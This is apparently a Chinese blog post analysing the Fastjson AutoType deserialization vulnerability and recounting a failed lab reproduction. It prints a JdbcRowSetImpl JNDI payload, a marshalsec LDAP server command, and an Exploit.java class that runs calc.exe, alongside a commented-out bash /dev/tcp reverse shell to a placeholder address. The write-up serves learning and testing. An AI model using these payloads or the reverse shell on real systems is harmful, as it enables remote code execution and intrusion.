---
title: Fastjson反序列化漏洞原理分析及复现
date: 2025-04-14 10:33:52
tags:
- fastjson
- 反序列化
categories:
  - [漏洞分析]
description: 本文介绍了 Fastjson反序列化漏洞原理分析及复现
---
@[TOC](Fastjson反序列化漏洞原理分析及复现)
# Fastjson序列化与反序列化
## 常规反序列化
Fastjson的序列化与反序列化与常规的java反序列化不同，我们先来看一下正常的java反序列化，使用下面一段代码：
```java
package com.armandhe.javabase;

import java.io.*;

public class Unserialize {
    public static void main(String[] args) {
        File file = new File("Unserilize.txt");
        try {

            //新建一个对象
            UnserializeTest unserializeTest = new UnserializeTest();
            unserializeTest.name = "armandhe";

            //序列化
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
            outputStream.writeObject(unserializeTest);
            outputStream.close();
//            fileOutputStream.close();

            //反序列化
            FileInputStream fileInputStream = new FileInputStream(file);
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            try {
                UnserializeTest o = (UnserializeTest) objectInputStream.readObject();
                System.out.println(o.name);
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

class UnserializeTest implements Serializable{
    public String name;
    private void readObject(ObjectInputStream in) throws IOException,ClassNotFoundException{
        in.defaultReadObject();
        System.out.println("执行了readObject函数！！");
        Runtime.getRuntime().exec("calc.exe");
    }
}
```
<!--more-->
> 反序列化的单词被我拼错了，尴尬，懒得改了

我们知道在java中要实现序列化的类的的实例，其类必须实现Serializable或者Externalizable接口，Serializable接口是一个空接口，其只是作为一个标志，而Externalizable这是对Serializable接口的再一次封装，如下图：

- Serializable接口
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/07de0133c7b3f58fdb4e11e6552128b8.png)
- Externalizable接口
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/212c7e8b414b9efadc307060d698e207.png)
可以看到Externalizable继承了Serializable接口，并添加了自己的方法。
因为这个原因，我们在demo中首先编写了一个UnserializeTest类用于被序列化，该类中重写了readObject方法，个人感觉也不算是重写，因为没有@override注解，应该是应为作用域的缘故导致在调用的时候先只能执行了本类中的readObject方法，在该类中我们执行了操作系统命令弹出一个计算机，并打印了一段话。
demo代码运行的结果就是，会在控制台打印：
```yaml
执行了readObject函数！！
armandhe
```
并生成一个Userilize.txt文件和弹出计算机，如下图：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5cacf695b502f8230904fb0374ca5a4c.png)
我们通过常规的方式打开Unserilize.txt会看到一堆乱码：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/41d8629728724b938a6fcdbe4839f1b8.png)
所以我们使用linux的xxd命令：
```shell
xxd Unserilize.txt
```
或者在windows中使用010editor打开它：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8f9292c92bd8d12b06758601d1ac4f7c.png)
需要注意的特征是，开头的ACED0005，这个是java序列化数据的特征，有助于我们快速定位程序的反序列化利用点。其实后面的73 72也有特定的含义，不过具体的我忘记了，感兴趣的朋友可以自行查询。我们可以利用工具对该数据进行解析：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/407450606885d51de67358e3bcf93471.png)
这样我们就可以看到对象序列化之前对应的类，以及其中其中的可被序列化的methods与fields。
常规java序列化调用的是writeObject方法，反序列化则调用的是readObject方法，如果目标类在实现的时候重写了readObject方法想我们的demo代码一样，并包含有一些危险的操作的参数是用户可控的话，那么就可能导致反序列化漏洞。
## Fastjson序列化与反序列化
Fastjson可以将JSONObject或者javaBean序列化为JSON字符串。关于javaBean的只是可以参考廖雪峰的网站：[javaBean是什么](https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680)

Fastjson在对javaBean进行序列化的时候会调用它的所有get或者is方法，反序列化的时候会调用所有的set方法，我们可以看下面的代码，如果这个set方法中含有一些危险的调用链，我们则可以利用这个反序列化过程来执行我们自己的命令：
首先我们准备一个javaBean，FastjsonUnserilizeTest.java
```java
package com.armandhe.javabase;

public class FastjsonUnserilizeTest {
    private String name;
    private int age;

    public String getName() {
        System.out.println("调用了getname方法！");
        return name;
    }

    public void setName(String name) {
        System.out.println("调用了setname方法！");
        this.name = name;
    }

    public int getAge() {
        System.out.println("调用了getage方法！");
        return age;
    }

    public void setAge(int age) {
        System.out.println("调用了setage方法！");
        this.age = age;
    }
}
```
然后是序列化与反序列化代码,FastjsonUnserilizeMain.java：
```java
package com.armandhe.javabase;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class FastjsonUnserilizeMain {
    public static void main(String[] args) {

        //新建对象
        System.out.println("新建对象：");
        FastjsonUnserilizeTest fastjsonUnserilizeTest = new FastjsonUnserilizeTest();
        fastjsonUnserilizeTest.setName("armband");
        fastjsonUnserilizeTest.setAge(24);
        //序列化
        System.out.println("\n序列化：");
        String s = JSON.toJSONString(fastjsonUnserilizeTest, SerializerFeature.WriteClassName);
        System.out.println(s);
        String jsonString = "{\"age\":25,\"name\":\"armbandnewpy\"}";
        //反序列化
        System.out.println("\n反序列化：");
        FastjsonUnserilizeTest fastjsonUnserilizeTest1 = JSON.parseObject(s, FastjsonUnserilizeTest.class);
        System.out.println(fastjsonUnserilizeTest1);
        String name = fastjsonUnserilizeTest1.getName();
        System.out.println(name);
    }
}
```
执行后控制控制台打印：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/e04a4f51c024bbfa1ca69f40ba0493cb.png)
第一部分是在我们新建对象的时候调用了两次set方法
第二部分是在序列化的时候调用了get方法
第三部分是在反序列化的时候调用了set方法
注意到Fastjson中序列化调用的是JSON.toJSONString方法，反序列化调用的是JSON.parseObject方法。

# Fastjson发序列化漏洞原理
我们注意到在进行序列化操作的时候JSON.toJSONString方法有一个参数SerializerFeature.WriteClassName，这个参数就是在序列化是包含类名，也就是这个参数导致了Fastjson的反序列化漏洞，这个参数实现的功能在Fastjson中被称作AutoType，即自动类型。如果不添加这个参数我们的javaBean序列化后应该是这样的：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/ded9132a1e351e460033a0f6271c6baa.png)
对比一下包含有上述参数：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/10feefd1c9ed9c4ffa16560dfddd199b.png)
可以看到多了一个@type参数。
如果没有SerializerFeature.WriteClassName参数，我们在进行反序列化时，代码这样写：
```java
String s= "{\"age\":25,\"name\":\"armbandnewpy\"}";
JSONObject jsonObject = JSON.parseObject(s);
```
这时候我们是不能控制到底要反序列化为什么类型的对象的，只能开发者在代码中指定好，如这样：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/21ae2fde7d3075a1f2e5479f21fe8053.png)
而如果我们在序列化的时候添加了该参数，我们则可以在反序列化的时候通过控制@type键的值来控制该序列化数据要被反序列化为什么样的对象，即调用什么类的set 方法，接下来要用到的就是找到这样一个类可以被用来完成我们想要的功能。
其中一个类是：com.sun.rowset.JdbcRowSetImpl
我们查看以下这个类，定位到setDataSource方法：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a2966598772acdc06ae5b39e34722680.png)
这段代码首先判断了this.getDataSourceName（）是否为空，我们定位到getDataSourceName（）方法处查看一下他的返回值：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/87dc01881a8358a40c7bfe72f7d5fcf1.png)
返回dataSource，是一个字符串类型，那么我们在反序列化调用set方法时dataSource首先是没有值的，也就是说this.getDataSourceName（）的返回值为null，这逻辑进入到else部分，调用了父类的setDataSourceName，并将var1传了进去。其实这一串都不重要，只需要知道反序列化的时候会自动调用setDataSourceName为DataSourceName赋值就可以了。
再在com.sun.rowset.JdbcRowSetImpl类中定位到setAutocommit方法：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8ee66d941bcb77f16736b104d5f7c0fb.png)
在定位到this.connect方法：
![](https://i-blog.csdnimg.cn/blog_migrate/b8ade61e0a47e61d179d1ac8b336e53e.png)
在这里我们注意到有个lookup方法，该方法就是JNDI中访问远程服务器获取远程对象的方法，其参数为服务器地址。如果其参数可控那么就可能被攻击，而this.getDataSourceName是获取DataSourceName的值得方法，那么我们只要控制了this.setDataSourceName方法的参数就可以访问我们自己的服务器了。而我们知道Fastjson在反序列化的时候会调用所有的set方法，正好可以通过setDataSourceName对DataSourceName进行赋值。于是，我们就有了这样的Fastjson序列化数据：
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/POC", "autoCommit":true}
```
这儿autoCommit好像必须设置为true，为啥我忘记了，昨天看的，待会儿去找找！！
漏洞的原理就是这样，接下来就是复现了，好紧张。。。。

# 一次失败的复现
我们利用现有的靶场环境：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8f1837d42ed28a8665c28ff8a57ee392.png)
将含有漏洞的war包直接放到tomcat的webapps目录下，然后启动tomcat就可以了，访问下：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/efdb2e55d3a0a078768e9bb6da82d399.png)
出啊先helloword则代表靶场搭建完毕，然后我们去看看这个war包怎么写的：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7b75e64d29cf5cdfbb7d971f319d98d2.png)
这里有两个文件，主要的逻辑在过滤器那个类中，我直接给他粘出来：
```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import spark.Spark;
import spark.servlet.SparkApplication;

public class IndexFilter implements SparkApplication {
    public IndexFilter() {
    }

    public void init() {
        Spark.get("/", (req, res) -> {
            return "Hello World";
        });
        Spark.post("/", (request, response) -> {
            String data = request.body();
            JSONObject obj = JSON.parseObject(data, new Feature[]{Feature.SupportNonPublicField});
            JSONObject ret = new JSONObject();
            ret.put("success", 200);
            ret.put("data", "Hello " + obj.get("name") + ", Your age is " + obj.get("age"));
            response.status(200);
            response.type("application/json");
            return ret.toJSONString();
        });
    }

    public static void main(String[] args) {
        IndexFilter i = new IndexFilter();
        i.init();
    }
}

```
可以看到，如果请求的方法为get则返回hello word ，如果为post则对传上来的数据进行反序列化操作，并输出 你的年纪与姓名这里面有一个
`new Feature[]{Feature.SupportNonPublicField});
            JSONObject ret = new JSONObject();
            ret.put("success", 200);` 参数是为了让被private修饰的值也能被反序列化。
我们传入正常的数据：
get请求：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/307874e2b5c35c8af6dfb6ddaf60ff64.png)
post请求：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/099df848f059bb14c7f99fcdfad49e30.png)
然后传入我们构造的payload:

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/e821001f94862210776e67cb368fc013.png)
在操作前记得先搭建好ldap服务器，使用的工具是marshalsec，可以在gihub上找到，命令是：
```shell
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1/#Exploit" 6666
```
当靶机访问该服务器的时候，会被重定向到本机的80端口上访问Exploit.class文件，Exploit.java文件中的内容为：
```java
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Exploit{
    public Exploit() throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"cmd","/c","calc.exe"});
      //Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/xx.xx.xx.xx/1888;cat <&5 | while read line; do $line 2>&5 >&5; done"});
        InputStream is = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));

        String line;
        while((line = reader.readLine()) != null) {
            System.out.println(line);
        }

        p.waitFor();
        is.close();
        reader.close();
        p.destroy();
    }

    public static void main(String[] args) throws Exception {
    }
}
```
执行了打开计算机的命令，但我的操作并没有打开计算机，据说是应为jdk版本的原因。详情见：
[Fastjson反序列化漏洞利用](https://www.jianshu.com/p/35b84eda9292)
参考文章：
[fastjson反序列化漏洞复现](https://www.cnblogs.com/nice0e3/p/14601670.html#0x02-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)
[Fastjson反序列化漏洞利用](https://www.jianshu.com/p/35b84eda9292)
